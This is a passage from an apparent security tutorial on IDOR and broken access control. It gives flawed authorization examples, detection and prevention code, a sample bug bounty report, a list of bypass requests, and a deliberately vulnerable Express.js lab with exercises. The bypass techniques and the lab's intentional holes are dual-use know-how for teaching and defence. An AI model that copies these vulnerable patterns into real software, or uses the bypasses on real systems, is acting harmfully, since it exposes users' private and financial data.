      {user.role === 'admin' && (
        <Link to="/admin/users">Admin Panel</Link>  // Hidden, not protected
      )}
    </nav>
  );
}
```

The admin endpoint `/admin/users` is fully functional. The frontend simply does not render a link to it. Any user who types the URL directly or finds it via JavaScript source maps can access it.

### 11.2 Checking Ownership on Read but Not Write

```javascript
// Checks authorization on GET but forgets on PUT/DELETE
app.get('/api/documents/:id', auth, async (req, res) => {
  const doc = await Document.findOne({
    _id: req.params.id,
    owner: req.user.id  // Good: ownership check
  });
  if (!doc) return res.status(404).json({ error: 'Not found' });
  return res.json(doc);
});

app.delete('/api/documents/:id', auth, async (req, res) => {
  await Document.deleteOne({ _id: req.params.id }); // Bad: no ownership check
  return res.json({ status: 'deleted' });
});
```

### 11.3 Authorization Check on the Wrong Field

```javascript
// Checks user ID in body instead of from token
app.put('/api/settings', auth, async (req, res) => {
  const { user_id, theme, language } = req.body;

  // WRONG: user_id from request body, not from token
  if (user_id !== req.body.user_id) { // This always passes -- comparing to itself
    return res.status(403).json({ error: 'Forbidden' });
  }

  await Settings.updateOne({ user_id }, { theme, language });
  return res.json({ status: 'updated' });
});
```

### 11.4 Using Predictable Composite Keys

```
/api/v1/reports/{year}/{month}/{employee_id}
```

A developer might assume that the three-part key is "hard to guess." In reality, `year` and `month` have 12-36 possible values, and `employee_id` is sequential. An attacker generates all combinations trivially.

---

## 12. Detection Strategies

### 12.1 Server-Side Detection

```javascript
// Middleware that logs potential IDOR attempts
function idorDetection(req, res, next) {
  const resourceUserId = req.params.userId || req.body?.user_id;
  const authenticatedUserId = req.user?.sub;

  if (resourceUserId && authenticatedUserId &&
      resourceUserId !== authenticatedUserId) {
    console.warn('POTENTIAL_IDOR', {
      timestamp: new Date().toISOString(),
      authenticated_user: authenticatedUserId,
      requested_resource_user: resourceUserId,
      endpoint: req.originalUrl,
      method: req.method,
      ip: req.ip,
      user_agent: req.headers['user-agent']
    });
  }

  next();
}
```

### 12.2 AWS CloudWatch Detection

```bash
# CloudWatch Insights query to detect potential IDOR patterns
# Identifies users making requests for multiple different user IDs
fields @timestamp, @message
| filter @message like /api\/v1\/users/
| parse @message '"authenticated_user":"*"' as auth_user
| parse @message '"requested_resource_user":"*"' as resource_user
| filter auth_user != resource_user
| stats count(*) as attempt_count by auth_user
| filter attempt_count > 10
| sort attempt_count desc
```

### 12.3 Automated SAST Rules

```yaml
# Semgrep rule to detect missing authorization checks
rules:
  - id: missing-authorization-check
    patterns:
      - pattern: |
          app.$METHOD('/api/.../:$ID', auth, async (req, res) => {
            const $RESULT = await $MODEL.findOne({ _id: req.params.$ID });
            ...
          });
      - pattern-not: |
          app.$METHOD('/api/.../:$ID', auth, async (req, res) => {
            const $RESULT = await $MODEL.findOne({
              _id: req.params.$ID,
              $OWNER_FIELD: req.user.$USER_FIELD
            });
            ...
          });
    message: "Potential IDOR: database query uses path parameter without ownership check"
    severity: ERROR
    languages: [javascript]
```

---

## 13. Prevention Strategies

### 13.1 Centralized Authorization Middleware

```javascript
// Centralized ownership verification middleware
function requireOwnership(resourceType) {
  return async (req, res, next) => {
    const resourceId = req.params.id || req.params[`${resourceType}Id`];
    const userId = req.user.sub;
    const tenantId = req.user.tenant_id;

    const resource = await db.query(
      `SELECT owner_id, tenant_id FROM ${resourceType}s WHERE id = $1`,
      [resourceId]
    );

    if (resource.rows.length === 0) {
      return res.status(404).json({ error: 'Not found' });
    }

    const row = resource.rows[0];

    // Check tenant isolation
    if (row.tenant_id !== tenantId) {
      return res.status(404).json({ error: 'Not found' }); // 404, not 403
    }

    // Check ownership (unless admin)
    if (row.owner_id !== userId && req.user.role !== 'admin') {
      return res.status(404).json({ error: 'Not found' }); // 404, not 403
    }

    req.resource = row;
    next();
  };
}

// Usage
app.get('/api/documents/:id', auth, requireOwnership('document'), handler);
app.put('/api/documents/:id', auth, requireOwnership('document'), handler);
app.delete('/api/documents/:id', auth, requireOwnership('document'), handler);
```

**Key detail:** Return 404, not 403. A 403 response confirms the resource exists, enabling enumeration. A 404 reveals nothing.

### 13.2 Indirect Reference Maps

Instead of exposing database IDs directly, map them to per-session random identifiers:

```javascript
// Generate an indirect reference map for the user's session
function createIndirectRefMap(userId, resources) {
  const crypto = require('crypto');
  const refMap = {};
  const reverseMap = {};

  for (const resource of resources) {
    const indirectRef = crypto.randomBytes(16).toString('hex');
    refMap[resource.id] = indirectRef;
    reverseMap[indirectRef] = resource.id;
  }

  // Store in server-side session, Redis, or encrypted cookie
  return { refMap, reverseMap };
}
```

The client sees `a3f8b2c1d4e5...` instead of `42`. Even if they change it to another random string, it will not map to a valid resource in their session.

### 13.3 Policy-Based Access Control with Casbin

```javascript
const { newEnforcer } = require('casbin');

const enforcer = await newEnforcer('model.conf', 'policy.csv');

// model.conf
// [request_definition]
// r = sub, obj, act
//
// [policy_definition]
// p = sub, obj, act
//
// [policy_effect]
// e = some(where (p.eft == allow))
//
// [matchers]
// m = r.sub == p.sub && keyMatch(r.obj, p.obj) && r.act == p.act

// Authorization middleware
async function authorize(req, res, next) {
  const sub = `user:${req.user.sub}`;
  const obj = req.originalUrl;
  const act = req.method;

  const allowed = await enforcer.enforce(sub, obj, act);
  if (!allowed) {
    return res.status(404).json({ error: 'Not found' });
  }
  next();
}
```

---

## 14. Bug Bounty Report Example

```markdown
## Title
IDOR in /api/v1/users/{id}/billing allows any authenticated user to
read billing details (PII, payment method, transaction history) of
any other user

## Severity
High (CVSS 7.5) -- Confidentiality impact is High. The attacker reads
sensitive PII and financial data of arbitrary users. No integrity or
availability impact.

## Summary
The endpoint GET /api/v1/users/{id}/billing performs authentication
(valid JWT required) but does not perform authorization (no check
that the JWT's `sub` claim matches the `{id}` path parameter).
Any authenticated user can read the billing information of any other
user by iterating over user IDs.

## Steps to Reproduce
1. Create two accounts:
   - Account A (attacker): user_id = 1041
   - Account B (victim): user_id = 1042
2. Log in as Account A and capture the JWT from the Authorization header
3. Send the following request:

    GET /api/v1/users/1042/billing HTTP/1.1
    Host: app.target.com
    Authorization: Bearer <account_A_jwt>

4. Observe that the response contains Account B's billing details:
   - Full name
   - Billing address
   - Last 4 digits of credit card
   - Transaction history
   - Subscription plan

## Impact
An attacker can enumerate all user IDs (sequential integers from 1 to
N) and extract the billing information of every user on the platform.
This exposes PII (names, addresses) and financial information (payment
methods, transaction amounts) for the entire user base. Estimated
affected users: ~150,000 based on the highest observed user ID.

## Remediation
Add an authorization check to the endpoint:

    if (req.params.id !== req.user.sub) {
      return res.status(404).json({ error: 'Not found' });
    }

Alternatively, remove the user ID from the path entirely and derive
it from the JWT:

    GET /api/v1/me/billing

## Supporting Evidence
[Screenshot of Burp Repeater showing the request and response]
[Screenshot of enumerated user IDs via Intruder]
```

---

## 15. Common Bypass Techniques

### 15.1 HTTP Method Switching

Authorization may only be enforced on one HTTP method:

```
GET /api/users/1042  --> 403 (blocked)
POST /api/users/1042  --> 200 (returns user data)
PUT /api/users/1042  --> 200 (allows modification)
```

### 15.2 Parameter Pollution

```
GET /api/users?id=1041&id=1042
```

Some frameworks take the last value, some take the first. If the authorization check reads the first `id` and the query uses the last, the attacker bypasses the check.

### 15.3 JSON Body Parameter Override

```
PUT /api/users/1041/settings HTTP/1.1
Content-Type: application/json

{
  "user_id": 1042,
  "theme": "dark"
}
```

The path says user 1041 (authorized), but the body's `user_id` field says 1042, and the backend uses the body value for the database query.

### 15.4 Wrapping IDs in Arrays

```json
{
  "document_ids": [1041, 1042, 1043, 1044, 1045]
}
```

Batch endpoints may check authorization on the first element and process all elements.

### 15.5 Swapping ID Types

```
GET /api/users/1042/profile  --> 403
GET /api/users/user@victim.com/profile  --> 200
```

The endpoint accepts both numeric IDs and emails. Authorization is checked against the numeric ID lookup path but not the email lookup path.

### 15.6 Version Rollback

```
GET /api/v2/users/1042/profile  --> 403 (patched in v2)
GET /api/v1/users/1042/profile  --> 200 (still vulnerable in v1)
```

Old API versions remain active and unpatched.

### 15.7 GraphQL Aliasing

```graphql
query {
  victim1: user(id: "1042") { email ssn }
  victim2: user(id: "1043") { email ssn }
  victim3: user(id: "1044") { email ssn }
}
```

A single GraphQL request can fetch multiple users' data using aliases, even if rate limiting would block sequential REST requests.

---

## 16. Lab Setup Ideas

### 16.1 Vulnerable Express.js Lab

```javascript
// docker-compose.yml for a complete IDOR lab
// docker-compose.yml:
// services:
//   api:
//     build: .
//     ports: ["3000:3000"]
//     environment:
//       - DATABASE_URL=postgres://lab:lab@db:5432/idorlab
//       - JWT_SECRET=weak_secret_for_lab
//   db:
//     image: postgres:15
//     environment:
//       - POSTGRES_USER=lab
//       - POSTGRES_PASSWORD=lab
//       - POSTGRES_DB=idorlab

const express = require('express');
const jwt = require('jsonwebtoken');
const { Pool } = require('pg');

const app = express();
app.use(express.json());
const pool = new Pool({ connectionString: process.env.DATABASE_URL });

// Login endpoint (issues JWT with user info)
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const result = await pool.query(
    'SELECT id, username, role, tenant_id FROM users WHERE username=$1 AND password=$2',
    [username, password]
  );
  if (result.rows.length === 0) return res.status(401).json({ error: 'Invalid' });

  const user = result.rows[0];
  const token = jwt.sign(
    { sub: user.id, role: user.role, tenant_id: user.tenant_id },
    process.env.JWT_SECRET,
    { expiresIn: '24h' }
  );
  return res.json({ token });
});

function auth(req, res, next) {
  try {
    req.user = jwt.verify(
      req.headers.authorization.split(' ')[1],
      process.env.JWT_SECRET
    );
    next();
  } catch { res.status(401).json({ error: 'Unauthorized' }); }
}

// LEVEL 1: Basic integer IDOR
app.get('/api/v1/users/:id/profile', auth, async (req, res) => {
  const result = await pool.query('SELECT * FROM users WHERE id=$1', [req.params.id]);
  return res.json(result.rows[0] || { error: 'Not found' });
});

// LEVEL 2: IDOR in POST body
app.post('/api/v1/messages', auth, async (req, res) => {
  const { to_user_id, content } = req.body;
  await pool.query(
    'INSERT INTO messages(from_user, to_user, content) VALUES($1,$2,$3)',
    [req.body.from_user_id, to_user_id, content]  // from_user_id from body!
  );
  return res.json({ status: 'sent' });
});

// LEVEL 3: Tenant isolation bypass
app.get('/api/v1/tenant/documents', auth, async (req, res) => {
  const tenantId = req.headers['x-tenant-id'];  // Client-controlled
  const result = await pool.query(
    'SELECT * FROM documents WHERE tenant_id=$1', [tenantId]
  );
  return res.json(result.rows);
});

// LEVEL 4: Admin endpoint with no role check
app.get('/api/v1/admin/all-users', auth, async (req, res) => {
  const result = await pool.query('SELECT * FROM users');
  return res.json(result.rows);
});

// LEVEL 5: Indirect IDOR via export
app.get('/api/v1/export/:userId', auth, async (req, res) => {
  const result = await pool.query(
    'SELECT * FROM users u JOIN orders o ON u.id = o.user_id WHERE u.id=$1',
    [req.params.userId]
  );
  res.setHeader('Content-Disposition', 'attachment; filename=export.json');
  return res.json(result.rows);
});

app.listen(3000, () => console.log('IDOR Lab running on :3000'));
```

### 16.2 Suggested Lab Exercises

1. **Basic IDOR:** Access another user's profile via the integer ID endpoint
2. **Body Parameter IDOR:** Send a message impersonating another user by changing `from_user_id`
3. **Tenant Bypass:** Access documents from a different tenant by modifying the `X-Tenant-ID` header
4. **Vertical Escalation:** Access the admin endpoint with a regular user's token
5. **Data Export IDOR:** Export another user's complete data including orders
6. **JWT Cracking:** Crack the weak JWT secret and forge an admin token
7. **Chain Everything:** Crack JWT, forge admin role, enumerate all users via admin endpoint, exfiltrate all data via export IDOR

---

## 17. Severity Breakdown

| Scenario | CVSS Range | Justification |
|---|---|---|
| Read-only access to non-sensitive data | Low (3.1-3.9) | Limited confidentiality impact |
| Read access to PII (email, name, address) | Medium (4.0-6.9) | Moderate confidentiality impact, privacy violation |
| Read access to financial/health data | High (7.0-8.9) | High confidentiality impact, regulatory implications |
| Write access to other users' resources | High (7.0-8.9) | Integrity impact, potential for data manipulation |
| Admin access / full tenant data breach | Critical (9.0-10.0) | Complete compromise of confidentiality and potentially integrity |
| Chained IDOR + JWT manipulation | Critical (9.0-10.0) | Full application compromise, all users affected |

---

## Conclusion

IDOR and broken access control persist because they are fundamentally logic bugs, not implementation bugs. No WAF will catch them. No scanner will reliably detect them. They require a human (or a very well-configured automation pipeline) to understand the application's authorization model and systematically test every endpoint against every role and tenant boundary.

The key takeaways for defenders:

1. **Derive identity from the server-side session or JWT, never from client input.** The user ID, tenant ID, and role must come from the authentication layer, not from path parameters, headers, or request bodies.
2. **Apply authorization checks on every endpoint, every HTTP method, every code path.** Use centralized middleware, not per-endpoint checks that developers forget.
3. **Return 404, not 403.** Do not confirm the existence of resources the user cannot access.
4. **Test authorization as rigorously as you test authentication.** Use Burp Autorize, write integration tests that verify cross-user access is blocked, and include IDOR checks in your CI/CD pipeline.
5. **Assume UUIDs will leak.** They are not a security control.

For attackers and bug bounty hunters: IDOR testing is systematic, not creative. Map every endpoint, test every parameter, swap every identifier. The vulnerability is almost always there; you just have to be thorough enough to find it.

---

*If you found this useful, explore the rest of the Security Deep Dive series where we cover payment manipulation, authentication bypasses, and more. Share your findings responsibly, and always test with authorization.*
